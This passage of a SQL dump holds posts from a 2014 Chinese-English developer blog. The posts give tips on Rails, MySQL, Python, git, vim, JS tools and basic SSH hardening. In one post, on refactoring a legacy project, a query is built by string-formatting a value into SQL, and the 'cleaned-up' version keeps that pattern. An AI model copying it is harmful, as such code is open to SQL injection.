&amp;&amp; bundle exec rake db:migrate RAILS_ENV=production\"\r\n  end \r\n\r\n</pre>',0,'2014-08-03 02:29:00','2014-08-03 02:31:54','2014-08-03 02:31:54',1,NULL,'','','','',139,'rails-gemfile-gemfiles-related-stuff-when-deploying-rails-app-to-production'),(318,'很奇怪的 database configuration does not specify adapter （由于多定义了多余的ActiveRecord造成的) ','<p>I met this problem due to the \'multiple database support issue\'. In my `app/model` folder, there is a file defined a redundant database connection: </p>\r\n<pre>class CacheCleanerActiveRecord &lt; ActiveRecord::Base\r\n  establish_connection \"cache_cleaner_#{Rails.env}\"\r\n  self.abstract_class = true\r\nend\r\n</pre>\r\n<p>but this database is not found in my database.yml ( because it\'s not used at all ). </p>\r\n<p>so the solution is quit simple: remove this file and everything is fine ! </p>\r\n<p>refer to: <a href=\"http://stackoverflow.com/questions/413659/database-configuration-does-not-specify-adapter/25101896#25101896\">http://stackoverflow.com/questions/413659/database-configuration-does-not-specify-adapter/25101896#25101896</a>\r\n</p>',0,'2014-08-03 05:22:00','2014-08-03 05:24:16','2014-08-03 05:24:16',1,NULL,'','','','',129,'database-configuration-does-not-specify-adapter-activerecord'),(319,'rails-jquery 中的callback (callback in rails-jquery (ujs ) ) ','<p>\r\n如下：    （refer to : <a href=\"http://stackoverflow.com/questions/13224482/rails-confirm-modifier-callback\">http://stackoverflow.com/questions/13224482/rails-confirm-modifier-callback</a> ) \r\n</p>\r\n<pre> &lt;%= coffee_script_tag do %&gt;\r\n $(document).on \'confirm:complete\', (e, answer) -&gt;\r\n   if(answer &amp;&amp; $(e.target).hasClass(\'push_button\') )\r\n     $(e.target).hide()\r\n     $(e.target).parent().prepend(\"<a href=\"#\" class=\"btn btn-warning\">推送中...</a> \")\r\n &lt;% end %&gt;\r\n\r\n</pre>',0,'2014-08-05 01:05:00','2014-08-05 01:07:20','2014-08-05 01:07:20',1,NULL,'','','','',110,'rails-jquery-callback-callback-in-rails-jquery-ujs'),(320,'查看MYSQL中所有DB的大小','<p>select table_schema \'db_name\' , sum(data_length) /1024/1024 \'size(mb)\' from information_schema.tables group by table_schema;</p>\r\n\r\n<pre>mysql&gt; select table_schema \'stat\' , sum(data_length) /1024/1024 \'data(mb)\', sum(index_length)/1024/1024 \'index(mb)\' from information_schema.tables group by table_schema;\r\n+--------------------+-----------------+-----------------+\r\n| stat               | data(mb)        | index(mb)       |\r\n+--------------------+-----------------+-----------------+\r\n| gu??_tmp           |     81.62409210 |      0.45410156 | \r\n| hive_tmp           |      0.27797318 |      0.07910156 | \r\n| hi??_wireless      |     62.82812500 |     31.01562500 | \r\n| information_schema |      0.00000000 |      0.00878906 | \r\n| mobile_production  |      0.52366257 |      0.45312500 | \r\n| mysql              |      0.54868793 |      0.10058594 | \r\n| performance_schema |      0.00000000 |      0.00000000 | \r\n| scheduler          |      8.54602623 |      4.39355469 | \r\n| slow_query_log     |     18.12500000 |      5.03125000 | \r\n| sta?               | 300910.57133389 | 185895.51367188 | \r\n| sta?_cms           |      1.32024574 |      0.11425781 | \r\n| sta?_freewap       |     27.45990467 |      8.10742188 | \r\n| stat_wap_pv        |      0.00343323 |      0.00195313 | \r\n| test               |      0.00012589 |      0.01269531 | \r\n+--------------------+-----------------+-----------------+\r\n</pre>',0,'2014-08-05 05:59:00','2014-08-05 06:03:54','2014-08-05 06:03:54',1,NULL,'','','','',110,'mysql-db'),(321,'python 入门 ： import 后调用文件变量','<p> 如何import 某个文件之后，调用它的变量？  </p>\r\n\r\n<pre># settings.py\r\ncache_on = 0\r\n\r\n# test_settings.py\r\nimport settings\r\nprint settings.cache_on  # =&gt; 0 \r\n</pre>',0,'2014-08-07 00:27:00','2014-08-07 00:43:25','2014-08-07 00:43:25',1,NULL,'','','','',109,'python-import'),(322,'拯救腐朽项目的步骤 (steps to save a fallen project ) ','<p>在搭建环境的过程中：</p>\r\n<p>1. 没有文档。 不知道如何在本地搭建环境</p>\r\n<p>目前： 所有的开发都是直接把代码\'dui3\'到生产服务器上。 在钢丝上敲代码。&#160;</p>\r\n<p>&#160;&#160;要安装哪些lib, 哪些 dependency, 哪些数据库，都要写清楚。 &#160; 比如： &#160;项目A，依赖了3中DB: mysql, mongodb, redis. &#160;</p>\r\n<p>2. 没有本地数据库。 &#160;</p>\r\n<p>目前： 所有开发都是链接生产数据库。&#160;</p>\r\n<p>解决办法： 把远程的生产数据库导出来。 由于远程数据太多，所以mysqldump 时只导出前2000条数据 。 &#160;</p>\r\n<p>3. &#160; 文件不全。</p>\r\n<p>目前：很多配置文件和运行文件都不在SCM中。</p>\r\n<p>解决办法： 对比远程的数据，把文件一点一点下载到本地。 对于某些敏感的配置文件， 把它从 settings.py 变成 settings.py.example</p>\r\n<p>4. &#160;部署方式不规范</p>\r\n<p>目前： 改好代码之后， 把相关的代码SFTP到生产服务器上。 &#160;&#160;</p>\r\n<p>解决办法： &#160;使用capistrano 做部署， 可以自动化部署，省时省力。而且可以回滚。</p>\r\n<p>5. 有很多多余的文件，放到了 SCM中。&#160;</p>\r\n<p>目前： .pyc 这样的编译文件， 以及 .svn 文件，都保存在了 git 中。&#160;</p>\r\n<p>解决办法： 把它们都删掉。 \r\n</p>\r\n<pre> \r\n$ git rm *.pyc\r\n$ find . -name .svn -exec git rm -rf {} \\;\r\n</pre>\r\n<p>6. css, js 文件 过多，没有合并。</p>\r\n<p>目前： &#160;124个外部 js 文件， &#160;26个外部 css 文件， 每次加载时间 在800ms</p> \r\n<pre>150 requests  ❘  78.3 KB transferred  ❘  740 ms (load: 793 ms, DOMContentLoaded: 760 ms\r\n</pre>\r\n<p>解决办法： &#160;将各种 js, css 都合并。 &#160; （例如ruby中的 <a href=\"https://github.com/sbecker/asset_packager\">asset_packager: https://github.com/sbecker/asset_packager </a>)</p>\r\n<p>7. 命名不规范。&#160;</p>\r\n<p>目前： &#160;page2/index.html &#160; &#160;page3/index2.html &#160; , &#160; &#160; &#160; xyh = \'\', &#160; btz = \'\' &#160;，完全看不懂。 &#160;甚至还有f#ck 这样的文件名。 -_-!&#160;\r\n</p>\r\n<p>解决办法： &#160;改成有意义的名字，比如： &#160;apple = \'\' &#160; &#160;tree = \'\' &#160; &#160;is_from_remote = \'\' &#160; ，</p>\r\n<p>8. 各种依赖的外部地址，直接写在了代码中，没有提取出公共的常量，</p>\r\n<p>目前： 某个地址依赖的外部应用 ： some_app.com  总共出现了6次。而如果不考虑端口，则出现了20多次。</p>\r\n<p>解决办法：把所有依赖的外部应用都提取到一个配置文件当中。这样修改起来也会很方便。</p>\r\n<p>9.方法过长：</p>\r\n<p>目前：程序的入口方法，超过了1200行。注意：这是一个方法哦亲！</p>\r\n<p>解决办法： 重构，extract method.</p>\r\n<p>10.代码没有整理过。处女座情何以堪。</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wOC8wNy8xM18zNF8xOV8zNTNfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDhfMDdfMTNfMzNfMjUucG5nBjoGRVQ/Screenshot%20from%202014-08-07%2013png:25.:ext\" title=\"Screenshot From 2014 08 07 13:33:25\" alt=\"Screenshot From 2014 08 07 13:33:25\" rel=\"225x255\" width=\"1280\" height=\"800\" /></p>\r\n<p>解决办法： 果断代码美化啊亲!  <a href=\"http://jsbeautifier.org/\">http://jsbeautifier.org/</a>&#160; （非常给力， 原来7000行的代码，美化之后（变成 4220 行））</p>\r\n<p>11. 各种 bad smell 的代码：</p>\r\n<pre># 老旧代码：\r\n        if res_u != None:\r\n            c.execute(\" select user_id,role_id from `stat_acl_role_user` where user_id = %s  \" % res_u[0])\r\n            res = c.fetchall()\r\n        else:\r\n            c.execute(\" select user_id,role_id from `stat_acl_role_user` limit 1  \"   )   \r\n            res = c.fetchall()\r\n\r\n# 整理后的代码： (这里用一个 三元表达式 更合适 ）\r\n        if res_u != None:\r\n            sql_string = \" select user_id,role_id from `stat_acl_role_user` where user_id = %s  \" % res_u[0]\r\n        else:\r\n            sql_string = \" select user_id,role_id from `stat_acl_role_user` limit 1  \" \r\n        c.execute(sql_string)\r\n        res = c.fetchall()\r\n\r\n</pre>',0,'2014-08-07 03:01:00','2014-08-07 03:21:49','2014-08-07 07:33:25',1,NULL,'','','','',120,'steps-to-save-a-fallen-project'),(323,'干掉文件末尾的^M ( remove trailing ^M characters  ) ','<p>refer to: <a href=\"http://stackoverflow.com/questions/811193/how-to-convert-the-m-linebreak-to-normal-linebreak-in-a-file-opened-in-vim\">http://stackoverflow.com/questions/811193/how-to-convert-the-m-linebreak-to-normal-linebreak-in-a-file-opened-in-vim</a>\r\n</p>\r\n<p>Within vim, look at the file format — DOS or Unix:</p>\r\n<p>:set filetype=unix</p>\r\n<p>:set fileformat=unix</p>\r\n<p>The file will be written back without carriage return (CR, ^M) characters.</p>',0,'2014-08-07 10:47:00','2014-08-07 10:47:37','2014-08-07 10:48:05',1,NULL,'','','','',131,'m-remove-trailing-m-characters'),(324,'在Rails项目中增加rspec (add rspec to rails and test lib files) ','<p>1. add to Gemfile:</p>\r\n<pre># Gemfile: \r\ngem \'rspec-rails\', \'~&gt; 3.0.0\'\r\n\r\n# in console: \r\n$ bundle exec rails generate rspec:install\r\n</pre>\r\n\r\n<p>2. make sure your have this:\r\n</p>\r\n<pre># config/application.rb\r\nconfig.autoload_paths += %W(#{config.root}/lib)\r\n</pre>\r\n<p> test a file in lib folder: </p>\r\n<pre>require \'html_parser\'  # it\'s not require \'lib/html_parser\'\r\ndescribe HtmlParser do\r\n\r\n  it \'should parse html_content\' do\r\n    puts \'hihihi\'\r\n  end \r\n\r\nend\r\n\r\n</pre>',0,'2014-08-10 02:09:00','2014-08-10 02:12:45','2014-08-10 02:12:45',1,NULL,'','','','',95,'rails-rspec-add-rspec-to-rails-and-test-lib-files'),(325,'nokogiri 的xpath方法比 ancestor() 快的多（nokogiri xpath() is much faster than ancestor()   )','<p>for short: &#160;using xpath will save your 95% cpu time than using ancestor().first</p>\r\n<p>我的一个方法，原来使用了 .ancestors().first , &#160; 运行一次3 分钟。 &#160;&#160;</p>\r\n<p>后来改成了 xpath(\'./ancestor::table[1]\') , 运行一次 5秒。 &#160; 节省了大约96%的时间！</p>\r\n\r\n<pre>Finished in 5.81 seconds\r\n3 examples, 0 failures\r\n\r\n</pre>',0,'2014-08-11 05:38:00','2014-08-11 05:42:59','2014-08-11 05:42:59',1,NULL,'','','','',109,'nokogiri-xpath-ancestor-nokogiri-xpath-is-much-faster-than-ancestor'),(326,'关于前端开发一些利器。 ( some tools for javascript development ) ','<p>Bower  (<a href=\"http://bower.io/\">http://bower.io/</a>) :  帮我们下载某个JS插件的各种依赖包。 相当于 ruby中的 bundler.   省得我们为了安装某个JS 插件而手动下载各个第三方js 文件了。 而且可以达到最好的兼容性。 </p>\r\n\r\n<p> Grunt:  (<a href=\"http://gruntjs.com/\">http://gruntjs.com/</a>): JS中的自动化工具，帮我们一键完成各种操作 （运行单元测试， 清理临时文件， 生成压缩后的JS文件等） ， 相当于java中的 ant/maven, ruby中的rake 。 </p> \r\n\r\n<p> Require JS (<a href=\"http://requirejs.org/\">http://requirejs.org/</a>)： 当某个项目的JS文件越来越多的时候，可以很方便的加载它们。  </p>\r\n\r\n<p> Jasmine ( <a href=\"http://jasmine.github.io/\">http://jasmine.github.io/</a> ) : 单元测试的JS框架。 相当于java中的 JUnit,  Ruby中的 Rspec（语法极其相似） </p>\r\n\r\n<p> 最后， 是一款不必编码就可以使用的工具： selenium( <a href=\"http://code.google.com/p/selenium/\">http://code.google.com/p/selenium/</a>&#160; 我们可以录制它的脚本并且回放。 在回放过程中进行判断。 &#160;它还能根据脚本生成各种语言对应的 文件(比如java/ruby/python ) 然后在后台执行。 &#160;如果某个页面的js 特别难于测试，我们就用它～&#160;)   </p> ',0,'2014-08-14 08:13:00','2014-08-14 08:54:15','2014-08-14 08:56:30',1,NULL,'','','','',92,'some-tools-for-javascript-development'),(327,'git diff 忽略空白行','<p>最近的一个项目，文件动辄 几千行，而且是DOS格式的， 一旦在LINUX下保存，再 git diff , 看到的全市空白行的变化。&#160;</p>\r\n<p>所以， 我们要忽略空白行：</p>\r\n<p>$ git config --global alias.dfw \'diff --ignore-space-change\'</p>\r\n<p>$ git dfw .&#160;</p>',0,'2014-08-18 10:32:00','2014-08-18 10:33:48','2014-08-18 10:33:48',1,NULL,'','','','',64,'git-diff'),(328,'python 世界中的bundler （ bundler equivalent in Python ) ','<p>copied from : <a href=\"http://stackoverflow.com/a/8736419/445908\">http://stackoverflow.com/a/8736419/445908</a>\r\n</p>\r\n<p>简言之，就是使用 &#160;requirement.txt</p>\r\n<p>From what i\'ve read about bundler — pip without virtualenv should work just fine for you. You can think of it as something between regular gem command and bundler. Common things that you can do with pip:</p>\r\n<p>Installing packages (gem install)</p>\r\n<p>pip install mypackage<br />Dependencies and bulk-install (gemfile)</p>\r\n<p>Probably the easiest way is to use pip\'s requirements.txt files. Basically it\'s just a plain list of required packages with possible version constraints. It might look something like:</p>\r\n<p>nose==1.1.2<br />django&lt;1.3<br />PIL<br />Later when you\'d want to install those dependencies you would do:</p>\r\n<p>$ pip install -r requirements.txt<br />A simple way to see all your current packages in requirements-file syntax is to do:</p>\r\n<p>$ pip freeze<br />You can read more about it here.</p>\r\n<p>Execution (bundler exec)</p>\r\n<p>All python packages that come with executable files are usually directly available after install (unless you have custom setup or it\'s a special package). For example:</p>\r\n<p>$ pip install gunicorn<br />$ gunicorn -h <br />Package gems for install from cache (bundler package)</p>\r\n<p>There is pip bundle and pip zip/unzip. But i\'m not sure if many people use it.</p>',0,'2014-08-19 06:06:00','2014-08-19 06:08:00','2014-08-19 06:08:22',1,NULL,'','','','',70,'python-bundler-bundler-equivalent-in-python'),(329,'node-webkit 的script 必须写在<head>中（ script tag must be in the <head> in node-webkit)','<p>as it is.&#160;</p>',0,'2014-08-20 08:02:00','2014-08-20 08:03:42','2014-08-20 08:03:42',1,NULL,'','','','',63,'node-webkit-script-head-script-tag-must-be-in-the-head-in-node-webkit'),(330,'保护好服务器的安全( make your server safe ) ','<p>1. 不要使用 默认端口做为 ssh 的端口。 &#160; ( Never and ever use the default port of SSH)&#160;</p>\r\n<p>办法： &#160;<br />&#160; 1. &#160;$ vim &#160;/etc/ssh/sshd_config &#160; &#160; , &#160; modify the Port 22&#160;<br />&#160; 2. &#160;$ /etc/init.d/ssh reload</p>\r\n<p>2. 不要把服务器的IP地址， PORT 端口以及密码放到 settings.example 文件中。 &#160;目前github 已经成为最大的信息泄漏源。 &#160; ( don\'t put your server\'s password to git repo ) &#160;</p>\r\n<p>3. 经常查看 ： &#160;/var/log/auth.log &#160;， 看看有什么不对进的地方。 （目前我的服务器每天遭受 6000次以上的 SSH 登录尝试。。。） &#160; ( always check your /var/log/auth.log from time to time. currently there are 6k ssh hacks every day to my server )&#160;</p>',0,'2014-08-29 01:54:00','2014-08-29 01:59:41','2014-08-29 01:59:41',1,NULL,'','','','',43,'make-your-server-safe'),(331,'搭建android 开发环境（setup android development environment )','<p>参考：http://developer.android.com/sdk/installing/index.html</p>',0,'2014-09-08 00:31:00','2014-09-08 00:32:50','2014-09-08 00:32:50',1,NULL,'','','','',2,'android-setup-android-development-environment');
